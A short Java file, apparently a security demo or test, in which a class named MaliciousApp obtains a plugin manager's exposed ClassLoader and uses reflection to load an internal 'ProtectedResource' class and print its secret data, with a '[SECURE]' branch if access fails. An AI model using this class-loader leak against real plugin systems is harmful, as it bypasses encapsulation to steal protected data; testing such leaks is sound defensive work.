package com.app;

import com.plugin.PluginManager;
import java.lang.reflect.Method;

public class MaliciousApp {
    public static void main(String[] args) {
        System.out.println("--- Starting App ---");
        PluginManager manager = new PluginManager();

        // Legitimate use
        manager.runPluginTask("LogAnalytics");

        // EXPLOIT: Obtaining the ClassLoader to access restricted classes
        try {
            System.out.println("\n[ATTACK] Attempting to leak internal class loader...");
            ClassLoader exposedLoader = manager.getLoader();

            if (exposedLoader != null) {
                System.out.println("[ATTACK] ClassLoader obtained: " + exposedLoader);

                // Now use the loader to manually load a "protected" class
                Class<?> internalClass = Class.forName("com.plugin.internal.ProtectedResource", true, exposedLoader);
                Method getSecret = internalClass.getMethod("getSecretData");
                String secret = (String) getSecret.invoke(null);

                System.out.println("[ATTACK] Leaked Secret Data: " + secret);
            }
        } catch (Exception e) {
            System.out.println("[SECURE] Access to internal resource failed: " + e.getMessage());
        }
    }
}
